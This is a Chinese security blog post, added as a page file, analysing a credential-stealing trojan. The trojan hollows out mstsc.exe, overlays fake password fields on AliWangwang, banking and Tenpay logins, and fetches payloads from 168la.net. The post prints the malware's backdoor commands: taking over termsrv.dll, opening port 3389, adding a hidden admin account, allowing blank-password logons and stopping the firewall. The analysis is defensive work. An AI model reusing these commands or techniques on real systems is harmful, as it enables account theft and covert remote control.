@@ -1,0 +1,842 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+  <meta name="google-site-verification" content="DRmBBL5LYsJ_2wCsJIYYsBfu8hVW8DQYzmpqGMp-njU" />
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1"/>
+
+
+    <meta name="description" content="水中月.镜中花.浮华一片苍凉.." />
+
+
+
+  <meta name="keywords" content="盗号," />
+
+
+
+  <link rel="alternate" href="/atom.xml" title="idhyt's blog" type="application/atom+xml" />
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
+
+
+<meta name="description" content="多功能盗号木马行为分析
+调试环境：Windows XP SP3, OD, IDA, 010Editor等
+病毒简介1 病毒运行后会两次注入到远程桌面进程中实现其主要功能，该功能会伪造假的用户密码输入框来获取用户密码信息，其中包括阿里，银行和财付通2 该病毒会释放一些旧版本的控件以及远程桌面链接dll文件，从而实现远程多用户登陆。3 母体实现的功能：将功能子体两次注入到mstsc.exe进程4 子体">
+<meta property="og:type" content="article">
+<meta property="og:title" content="病毒分析-多功能盗号木马">
+<meta property="og:url" content="http://blog.idhyt.com/2013/12/19/virus-troj-mutil/index.html">
+<meta property="og:site_name" content="idhyt's blog">
+<meta property="og:description" content="多功能盗号木马行为分析
+调试环境：Windows XP SP3, OD, IDA, 010Editor等
+病毒简介1 病毒运行后会两次注入到远程桌面进程中实现其主要功能，该功能会伪造假的用户密码输入框来获取用户密码信息，其中包括阿里，银行和财付通2 该病毒会释放一些旧版本的控件以及远程桌面链接dll文件，从而实现远程多用户登陆。3 母体实现的功能：将功能子体两次注入到mstsc.exe进程4 子体">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-1.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-2.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-3.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-4.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-5.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-6.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-7.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-8.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-9.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-10.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-11.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-12.png">
+<meta property="og:image" content="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-13.png">
+<meta property="og:updated_time" content="2015-12-31T11:58:10.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="病毒分析-多功能盗号木马">
+<meta name="twitter:description" content="多功能盗号木马行为分析
+调试环境：Windows XP SP3, OD, IDA, 010Editor等
+病毒简介1 病毒运行后会两次注入到远程桌面进程中实现其主要功能，该功能会伪造假的用户密码输入框来获取用户密码信息，其中包括阿里，银行和财付通2 该病毒会释放一些旧版本的控件以及远程桌面链接dll文件，从而实现远程多用户登陆。3 母体实现的功能：将功能子体两次注入到mstsc.exe进程4 子体">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> 病毒分析-多功能盗号木马 | idhyt's blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-71783676-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?5228d77c5752954f270fcca0908555af";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">云淡风轻</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu menu-left">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br />
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            <i class="menu-item-icon icon-next-categories"></i> <br />
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br />
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br />
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            <i class="menu-item-icon icon-next-about"></i> <br />
+            关于
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <form class="site-search-form">
+    <input type="text" id="st-search-input" class="st-search-input st-default-search-input" />
+  </form>
+
+
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install', 'VpXUP87KQneoFZ3srxxA','2.0.0');
+</script>
+
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              病毒分析-多功能盗号木马
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2013-12-19T11:11:11+08:00" content="2013-12-19">
+            2013-12-19
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/virus/" itemprop="url" rel="index">
+                  <span itemprop="name">virus</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2013/12/19/virus-troj-mutil/#comments" itemprop="discussionUrl">
+              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2013/12/19/virus-troj-mutil/" itemprop="commentsCount"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p>多功能盗号木马行为分析</p>
+<h2 id="调试环境：">调试环境：</h2><p>Windows XP SP3, OD, IDA, 010Editor等</p>
+<h2 id="病毒简介">病毒简介</h2><p>1 病毒运行后会两次注入到远程桌面进程中实现其主要功能，该功能会伪造假的用户密码输入框来获取用户密码信息，其中包括阿里，银行和财付通<br>2 该病毒会释放一些旧版本的控件以及远程桌面链接dll文件，从而实现远程多用户登陆。<br>3 母体实现的功能：将功能子体两次注入到mstsc.exe进程<br>4 子体实现的功能：远盗取阿里等用户密码，远程监控，远程截屏截窗，多用户登陆等。</p>
+<h2 id="病毒母体运行流程">病毒母体运行流程</h2><p>0x1 通过函数FindFirstFileA找到母体同目录下的lin.dll文件，调用LoadLibraryA函数将其加载，如果找不到，会弹出“缺少文件请解压完全”提示框。</p>
+<p>0x2 通过函数GetProcAddress获取lin.dll文件中函数子程序1地址，之后跳入子程序1函数执行</p>
+<p>0x3 释放运行所需的文件<br>1通过FindFirstFileA查找文件”C:\Program Files\security\servisc.exe”如果文件不存在则释放。<br>2调用CreateDirectoryA生成目录”C:\Program Files\security”，在该目录下依次释放6个文件。<br>3释放 servise.exe文件，从偏移0x6446B写入0x72180字节数据<br>4释放msvcr100.dll，从偏移0xd6600写入0xbcf50字节数据<br>5释放msvcp100.dll，从偏移0x193565写入0x66D50字节数据<br>6释放dxy.dat，从偏移0x1fc2d5写入0x11d726字节数据<br>7释放dxy2.dat，从偏移0x3179fc写入0x48FA6字节数据<br>8释放crt.dll 偏移0x3609b2写入0x42738字节数据<br>9将同目录的version.ini文件拷贝到C:\Program Files\security目录下</p>
+<p>0x4 生成快捷图标加如开始启动项<br>1将C:\Program Files\security\servisc.exe创建快捷方式，命名为系统漏洞修复<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-1.png" alt=""><br>2将该快捷方式拷贝到目录C:\Documents and Settings\Admin\「开始」菜单\程序\启动</p>
+<p>0x5运行主要注入功能DLL文件crt.dll<br>1创建进程C:\Program Files\security\servisc.exe<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-2.png" alt=""><br>2该文件servisc.exe为具有数字签名的正常暴风影音业务组件，该文件运行时会自动加载同目录下的三个dll文件，分别为crt.dll，MSVCP100.dll和MSVCR100.dll<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-3.png" alt=""><br>3其中MSVCP100.dll和MSVCR100.dll为正常的dll文件，crt.dll为病毒主要功能dll，用来注入进程。</p>
+<p>0x6 之后制造虚假弹窗，进程退出，后台自动完成注入功能<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-4.png" alt=""></p>
+<h2 id="子体Crt-dll注入功能">子体Crt.dll注入功能</h2><p>0x1 将dxy2.dat文件拷贝到内存，验证头四个字节是否为33E0F0Dh</p>
+<p>0x2 从dxy2.dat偏移0x4处获取解密文件大小0x99000，申请内存将解密出的dxy2.dat写入内存</p>
+<p>0x3 将dxy2.dat注入远程桌面进程mstsc.exe<br>1创建远程桌面进程c:\windows\system32\mstsc.exe，将该线程挂起<br>2定义一个CONTEXT 结构变量，将其ContextFlags 初始CONTEXT_INTEGER<br>3使用GetThreadContext 取得上下文（寄存器的值）。<br>4 Context结构中偏移+0xA4处存放着EBX的值，该值为目标进程PEB结构起始地址，偏移+0xB0存放着EAX值，该值为目标进程OEP，即：<br>GetThreadContext(pi.hThread,&amp;ThreadCxt);<br>PEB addr = ThreadCxt.Ebx ;<br>OEP add = ThreadCxt.Eax;<br>5 获取PEB结构偏移+0x8地址，该地址存放着目标进程的映像基址。<br>6调用VirtualAllocEx在目标进程中申请空间<br>7调用ZwWriteVirtualMemory将解密出来的dxy2.dat按照PE格式写入进程mstsc.exe中<br>8最后在7FFD3008处（PEB结构偏移+0x8目标进程的映像基址）写入注入进程基址0x400000<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-5.png" alt=""><br>9获取注入进程的OEP，修改寄存器eax值为注入进程的OEP。<br>10用SetThreadContext 更新系统中线程的上下文。<br>11调用ZwResumeThread恢复目标进程去执行自己注入的进程dxy2.dat<br>调用ZwGetContextThread和ZwSetContextThread修改目标进程线程执行位置[D1] </p>
+<h2 id="子体Dxy2-exe远控功能">子体Dxy2.exe远控功能</h2><p>0x1 生成两个线程用于远程监控桌面和声音</p>
+<p>0x2解析域名168la.net返回IP地址生成3个URL：</p>
+<pre><code><span class="string">http:</span><span class="comment">//IP:1111/dxymd5.txt</span>
+<span class="string">http:</span><span class="comment">//IP:1111/dxy.dat</span>
+<span class="string">http:</span><span class="comment">//IP:1111/dllmd5.txt</span>
+</code></pre><p>从三个URL下载出对应的文件对crt.dll和dxy.dat文件MD5值进行校验。</p>
+<p>0x3 将dxy.dat注入远程桌面进程mstsc.exe<br>1读取C:\Program Files\security目录下dxy.dat到内存，检验头四个字节是否为0x33E0F0D<br>2从偏移0x4处取出解密后的大小0x276000，然后申请0x276000字节的内存，将解密数据存放在该内存中。<br>3创建进程c:\windows\system32\mstsc.exe，之后将解密dxy.dat注入，注入方式同dxy2.dat<br>4执行dxy.exe</p>
+<h2 id="子体Dxy-exe盗号功能">子体Dxy.exe盗号功能</h2><h3 id="创建线程0x402BFF杀掉aliimsafe-exe进程">创建线程0x402BFF杀掉aliimsafe.exe进程</h3><p>1 通过函数CreateToolhelp32Snapshot创建快照，调用函数Process32First和Process32Next循环遍历进程找到aliimsafe.exe进程。<br>2调用TerminateProcess将进程结束。</p>
+<h3 id="获取系统信息加密储存">获取系统信息加密储存</h3><p>1读取配置文件C:\Program Files\security\version.ini验证是否为t1<br>2 通过GetComputerNameA获取计算机名字，<br>加密写入C:\WINDOWS\system32\备注xa.txt<br>调用GetSystemTime获取当前系统时间，<br>加密写入C:\WINDOWS\system32\time3321</p>
+<h3 id="创建线程0x410362建立远程链接">创建线程0x410362建立远程链接</h3><p>解析域名www.168la.net得到IP与1720端口建立链接，用于通信和远程控制，该功能在后边描述。</p>
+<h3 id="创建线程0x410BAE获取阿里旺旺账户密码">创建线程0x410BAE获取阿里旺旺账户密码</h3><p>1调用GetCursorPos不停的捕获光标设置，通过WindowFromPoint获取窗口句柄，通过GetClassName获取窗口类名<br>2 检测该窗口是否存在ATL:Edit控件，该控件为阿里旺旺密码输入框控件，如果存在则通过GetWindowsThreadProcessID获取进程ID并通过GetModuleFileNameExA获取进程名。<br>3 检测该进程是否为AliIM.exe，如果是则检测窗口名是否为“阿里旺旺”<br>4 如果为阿里旺旺窗口则重新绘制一个假的ATL:Edit密码输入框将原来的覆盖，<br>并清空原来控件上已经存在的密码信息。<br>5当用户输入密码以后就将其捕获，并将输入的密码同步到原始登陆窗的ATL:Edit控件中。<br>6如果进程不为 AliIM.exe则判断是否为银行，之后用相同的办法获取银行密码信息。[D2]<br>7当控件焦点失去即用户输入完密码点登陆之后，会触发消息响应事件CUEdit::OnKillfocus进入到处理流程.<br>8先解密出之前记录在C:\windows\system32\logxa.txt中的登陆信息和密码<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-6.png" alt=""><br>9 获取之前登陆的密码4141414141414141与当前输入的对比（比如当前输入的是4242424242424242）如果相等则不改变<br>10如果不相等，则获取当前系统时间，获取“编辑框_伪装”的数据即伪造的密码登陆框数据，按照格式写在原始密码之后<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-7.png" alt=""><br>11加密，写入logxa.txt文件中。</p>
+<h3 id="创建线程0x410C60替换qqedit-dll获取财付通密码">创建线程0x410C60替换qqedit.dll获取财付通密码</h3><p>1删除C:\Program Files\Tencent\Common Files\tencent\paycenter目录下qqedit.dll<br>2如果系统为64位还需删除C:\Program Files（x86）\Tencent\Common Files\tencent\paycenter目录下qqedit.dll<br>3 qqedit.dll为财付通安全控件，该控件保证用户在输入密码时候进入安全模式，不会被电脑记录按键位置。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-8.png" alt=""><br>4然后在同目录下释放1.2.0.6版本的qqedit.dll，将文件偏移0x2229DF处0x27778字节写入。<br>5 经测试，释放的1.2.0.6版本的qqedit.dll并没有屏蔽键盘输入记录，可被键盘记录软件记录下来。<br>6当用户填写支付密码时候，光标会处于财付通页面的ATL:Edit控件，之后用盗取阿里旺旺密码相同的方式在支付密码窗口绘制一个新的输入框。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-9.png" alt=""><br>7 按照获取阿里旺旺登陆密码的方式获取财付通密码<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-10.png" alt=""><br>8加密写入logxa.txt</p>
+<h3 id="主要盗号功能">主要盗号功能</h3><p>与www.168la.net:1720建立通信以后实现的功能。<br>该功能模块循环获取系统信息，盗取系统账户密码加密写入文件，最后读取所有文件信息发送给目标。</p>
+<h4 id="远程截屏">远程截屏</h4><p>1通过GetSystemMetrics获取屏幕的分辨率<br>2通过CreateCompatibleDC，CreateCompatibleBitmap，BitBlt获取屏幕位图信息<br>3通过CreatePalette，CreateCompatibleBitmap，StretchBlt等函数实现绘图<br>4 转成数据格式发送</p>
+<h4 id="远程截取指定窗口">远程截取指定窗口</h4><p>1通过FindWindowsExA获取指定窗口<br>2通过GetWindowsRect返回指定窗口的边框矩形的尺寸<br>3通过GetDC，CreateCompatibleDC，CreateCompatibleBitmap，PrintWindow，GetDIBits等函数绘制窗口<br>4转成数据格式发送</p>
+<h4 id="自动登陆5173转账_（未分析清楚）">自动登陆5173转账 （未分析清楚）</h4><p>1 调用CoInitialize创建com对象<br>2通过FindWindow找到指定窗口<br>3调用RegisterWindowMessage获取IHTMLDocument2接口<br>4通过解析该html信息，找到txtname，txtpass，txtcode（账户，密码，验证码）填写对应的value，然后模拟鼠标点击自动登陆<br>5 转账…(未分析清楚 - -!) </p>
+<h4 id="获取磁盘信息，遍历磁盘查找指定文件">获取磁盘信息，遍历磁盘查找指定文件</h4><p>1通过函数 GetLogicalDrives和GetDriveTypeA获取磁盘信息<br>2通过函数GetDiskFreeSpaceA获取磁盘剩余空间<br>3通过函数FindFirstFileA和FindNextFileA遍历查找指定文件</p>
+<h4 id="获取系统开机密码">获取系统开机密码</h4><p>1查看当前目录下是否存在GetUserPassWord.dll文件，如果不存在，则在当前文件释放GetUserPassWord.dll文件，该文件位于0x9AB17处，大小为0x1EFC8。<br>2调用该dll文件导出函数GetUserPassWord获取系统开机密码</p>
+<h4 id="远程登陆">远程登陆</h4><p>替换termsrv.dll,添加用户,打开3389服务,为多用户登陆做准备<br>1 释放2055版本的termsrv.dll</p>
+<pre><code><span class="built_in">CMD</span> <span class="bash">/C takeown /f C:\Windows\System32\termsrv.dll    //用户管理员权限打开
+</span><span class="built_in">CMD</span> <span class="bash">/C icacls <span class="string">"C:\Windows\System32\termsrv.dll"</span> /grant administrators:F  //添加权限</span>
+</code></pre><p>删除C:\Windows\System32\termsrv.dll<br>检测系统版本是x86还是x64释放对应的2055版本的termsrv.dll，该版本dll允许多用户远程登陆。<br>2调用函数SHGetSpecialFolderPathA获取路径C:/Documents and Settings/当前用户/Templates，在该目录下生成open3389.reg文件并写入数据运行</p>
+<pre><code><span class="built_in">CMD</span> <span class="bash">/C netsh firewall add portopening TCP <span class="number">3389</span> Netbios-ds</span>
+</code></pre><p>4调用NetUserAdd函数添加administratvr将其添加到管理员组并隐藏</p>
+<pre><code>CMD /C net localgroup administrators administratvr /add
+CMD /C REG ADD "HKLM<span class="command">\SOFTWARE</span><span class="command">\Microsoft</span><span class="command">\Windows</span> NT<span class="command">\CurrentVersion</span><span class="command">\Winlogon</span><span class="command">\SpecialAccounts</span><span class="command">\UserList</span>"/v administratvr /t reg_dword /d 0 /f  //将administratvr账户隐藏
+</code></pre><p>5输入四个命令将远程登陆服务设置为自动运行并启动该服务：</p>
+<pre><code><span class="built_in">CMD</span> <span class="bash">/C sc config TermService start= auto
+</span><span class="built_in">CMD</span> <span class="bash">/C sc start TermService
+</span><span class="built_in">CMD</span> <span class="bash">/C sc config MpsSvc start= auto
+</span><span class="built_in">CMD</span> <span class="bash">/C sc start MpsSvc</span>
+</code></pre><p>6将新的用户名和系统时间加密写入备份xa文件和time3321文件</p>
+<h4 id="开启远程桌面链接服务,实现多用户登陆">开启远程桌面链接服务,实现多用户登陆</h4><p>1遍历进程找到AliimSafe.exe将其结束<br>2取路径C:/Documents and Settings/当前用户/Templates，在该目录下生成重定向.reg文件，写入重定向数据，然后调用CreateProcess运行将该信息导入到注册表注册表MACHINE\SYSTEM\ControlSet001\Enum\Root\RDPDR<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-11.png" alt=""><br>3通过CMD命令开启远程桌面服务，并设置为自启动。</p>
+<pre><code><span class="built_in">CMD</span> <span class="bash">/C sc config tlntsvr start= auto  //基于TCP/IP网络的终端程序
+</span><span class="built_in">CMD</span> <span class="bash">/C sc start Telnet
+</span><span class="built_in">CMD</span> <span class="bash">/C sc config rdsessmgr start= auto   //打开远程桌面协助服务
+</span><span class="built_in">CMD</span> <span class="bash">/C sc start rdsessmgr
+</span><span class="built_in">CMD</span> <span class="bash">/C sc config rpcss start= auto
+</span><span class="built_in">CMD</span> <span class="bash">/C sc start rpcss
+</span><span class="built_in">CMD</span> <span class="bash">/C sc config Dcomlaunch start= auto  //请求远程访问
+</span><span class="built_in">CMD</span> <span class="bash">/C sc start Dcomlaunch
+</span><span class="built_in">CMD</span> <span class="bash">/C sc config winmgmt start= auto   //用于系统管理员创建WIndows管理脚本
+</span><span class="built_in">CMD</span> <span class="bash">/C sc start winmgmt</span>
+</code></pre><p>4通过cmd /c Tasklist/SVC &gt;&gt;命令将当前所有进程以及进程中加载的服务项保存到临时文件夹tmp155.txt中<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-12.png" alt=""><br>5查找是否存在dcomlaunch服务项，如果存在找到加载该服务对应的进程ID调用taskkill /pid命令将其结束。<br>6如果这个时候提示关机倒计时则调用cmd命令shutdown –a将其取消<br>7删除注册表：</p>
+<pre><code>SOFTWARE<span class="command">\Policies</span><span class="command">\Microsoft</span><span class="command">\Windows</span> NT<span class="command">\Terminal</span> Services<span class="command">\MaxInstanceCount</span>//服务器系统的并发连接数量进行控制
+Software<span class="command">\Microsoft</span><span class="command">\Windows</span><span class="command">\CurrentVersion</span><span class="command">\Run</span><span class="command">\aliim</span>//删除阿里旺旺自启动
+</code></pre><p>8修改注册表保证切换用户时不会断开网络连接</p>
+<pre><code>SOFTWARE<span class="command">\Microsoft</span><span class="command">\WindowsNT</span><span class="command">\CurrentVersion</span><span class="command">\Winlogon</span><span class="command">\KeepRASConnections</span>设为1
+SYSTEM<span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\Terminal</span> Server<span class="command">\fDenyTSConnections</span>设为1
+SYSTEM<span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\Terminal</span> Server<span class="command">\LicensingCore</span><span class="command">\EnableConcurrentSessions</span>
+</code></pre><p>9将termsrvs.dll加入服务组，开机自启动<br>注册表SYSTEM\CurrentControlSet\Services\TermService\Parameters\下创建子键ServiceDll键值为%SystemRoot%\System32\termsrvs.dll并在%SystemRoot%\System32\目录下释放termsrvs.dll<br>10调用CMD命令将该文件设置为只读，存档，隐藏</p>
+<pre><code><span class="built_in">CMD</span> /C <span class="built_in">Attrib</span> +H +S +R <span class="envvar">%SystemRoot%</span>\System32\termsrvs.dll
+</code></pre><p>11 取消默认用户空密码限制远程登陆</p>
+<pre><code><span class="keyword">reg</span> add <span class="string">"HKLM\SYSTEM\ControlSet001\Control\LSA"</span> /v limitblankpassworduse /t reg_dword /<span class="keyword">d</span> 0 /<span class="literal">f</span>
+<span class="keyword">reg</span> add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Control\LSA"</span> /v limitblankpassworduse /t reg_dword /<span class="keyword">d</span> 0 /<span class="literal">f</span>
+</code></pre><p>12打开之前关闭的服务</p>
+<pre><code>net <span class="built_in">stop</span> sharedaccess <span class="comment"> //关闭防火墙等共享服务</span>
+net <span class="built_in">start</span> dcomlaunch  <span class="comment"> // DCOM 服务器进程启动器</span>
+net <span class="built_in">start</span> termservice  <span class="comment"> //开启远程登陆服务</span>
+net <span class="built_in">stop</span> sharedaccess
+</code></pre><p>至此实现了远程多用户登陆，在不影响目标主机正常使用的的前提下，使用新的账户administratvr账户远程登陆到目标主机，实现远程控制。</p>
+<h4 id="检测登陆当前登陆用户，隐藏自身账户">检测登陆当前登陆用户，隐藏自身账户</h4><p>1 检测当前登陆用户，如果不是administrator则通过注册表将账户隐藏<br>REG ADD “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon<br>\SpecialAccounts\UserList” /v administrator /t reg_dword /d 0 /f<br>2提升进程权限<br>3调用函数SetSystemPowerState是计算机进入休眠状态<br>4 用户会重新用administrator账户登陆</p>
+<h4 id="发送信息到服务器">发送信息到服务器</h4><p>最后从备注xa.txt，logxa.txt和time3321解密出计算机名和系统时间以及获取的用户密码，发送到目标服务器<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-mutil-13.png" alt=""><br>其中备注xa.txt中记录这是否获取淘宝等账户密码，qt1表示获取到了淘宝密码。</p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/盗号/" rel="tag">#盗号</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2013/12/27/virus-infected-dnf/" rel="prev">病毒分析-virut感染型盗号木马</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2013/12/03/virus-infected-tem81/" rel="next">病毒分析-驱动感染型</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <div class="bdsharebuttonbox">
+	<a href="#" class="bds_more" data-cmd="more"></a>
+	<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+	<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+	<a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div id="disqus_thread">
+                <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="idhyt" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">idhyt</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">水中月.镜中花.浮华一片苍凉..</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">48</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            <a href="/categories">
+              <span class="site-state-item-count">7</span>
+              <span class="site-state-item-name">分类</span>
+              </a>
+          </div>
+
+          <div class="site-state-item site-state-tags">
